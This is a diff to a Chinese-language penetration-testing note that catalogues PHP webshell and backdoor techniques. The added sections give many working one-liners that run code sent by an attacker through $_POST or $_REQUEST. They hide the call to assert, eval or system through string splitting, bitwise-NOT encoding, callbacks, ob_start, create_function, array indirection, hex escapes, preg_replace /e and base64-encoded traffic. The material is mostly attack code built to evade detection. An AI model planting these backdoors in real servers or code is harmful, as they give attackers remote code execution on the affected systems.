@@ -69,7 +69,7 @@ assert($_FILES['file']['type']);
 eval($GLOBALS[_POST][code]);
 ```
 
-## 通过函数获取
+## 通过函数二阶获取
 
 #### get_defined_vars
 通过end(get_defined_vars()[_POST])获取
@@ -86,7 +86,7 @@ assert(end(get_defined_vars()[_POST]));
 ?>
 ```
 
-### mysqli_connect
+#### mysqli_connect
 还有
 smb \\127.0.0.1\1.txt
 ftp
@@ -444,6 +444,155 @@ $legal->doChain(2,"");
 ?>
 ```
 
+# sink
+代码执行的sink和代码流这块有点区别，执行任意代码的属于sink，执行指定代码的是代码流。
+
+## 动态调用-字符串
+
+#### 字符串拼接
+```php
+$func = 'as'.'sert';
+$func($_POST[1]);
+```
+
+#### 字符串分割
+```php
+<?php
+$code = "eval($####_POST####[1]);";
+$code = str_replace("####","",$code);
+eval($code);
+?>
+```
+
+#### 各种运算-异或
+```php
+<?php
+// $func = urlencode(~("assert"));
+// print($func);//%9E%8C%8C%9A%8D%8B
+$func = "%9E%8C%8C%9A%8D%8B";
+$func = ~urldecode($func);
+
+$func($_POST[1]);
+?>
+```
+
+## eval、assert同效果
+
+#### 回调函数
+https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html
+```php
+$e = $_REQUEST['e'];
+$arr = array($_POST['pass'],);
+array_filter($arr, $e);
+```
+
+#### 文件包含
+```php
+include('1.txt')
+```
+
+#### 双引号
+```php
+$code = $_POST[1];
+$data = "xxxxxxx{${eval($code)}}xxxxxx";
+```
+
+#### ob_start
+```php
+<?php
+$func = "system";
+$cmd = $_POST[1];
+ob_start($func);
+echo $cmd;
+ob_end_flush();
+?>
+```
+
+#### create_function
+```php
+<?php
+$code = $_POST[1];
+create_function('','1;}eval("'.$code.'");/*');
+?>
+```
+
+
+## 二阶获取sink
+#### 数组
+```php
+<?php
+$item['func'] = 'assert';
+$item['func']($_POST[1]);
+?>
+```
+
+#### 二维数组
+
+```php
+<?php
+$item['func'] = 'assert';
+$array[] = $item;
+$array[0]['func']($_POST[1]);
+?>
+```
+
+#### get_defined_functions
+```php
+<?php
+
+$arr = get_defined_functions()['internal'];
+
+print_r(get_defined_functions()['internal']);
+echo $arr[841]; //每个版本的assert数字不同， php版本5.6.27为850
+
+$arr[841]($_POST[1]);
+
+```
+
+
+#### 编码
+php7
+```php
+<?php
+"\x61\x73\x73\x65\x72\x74"($_POST[1]);
+?>
+```
+
+
+
+## 语法
+
+#### 斜杠
+php5.3测试成功
+```php
+<?php
+@eval\($_POST['code']);
+?>
+```
+
+
+#### preg_replace-@
+5.5
+7.0
+不再支持/e
+```php
+<?php
+@preg_replace('@(.*)@e','\\1',$_REQUEST[1]);
+?>
+```
+
+
+
+
+
+# 流量
+这块随便把流量编码或者加密
+```php
+//1=cGhwaW5mbygpOw==
+<?php
+eval(base64_decode($_POST[1]));
+?>
+```
+
 # 参考
-SkyBlue永恒、新仙剑之鸣、anlfi、mochazz、yzddMr6s、JamVayne
-等发过的文章。
+maple、SkyBlue永恒、新仙剑之鸣、anlfi、mochazz、yzddMr6s、JamVayne、UltramanGaia等发过的文章。
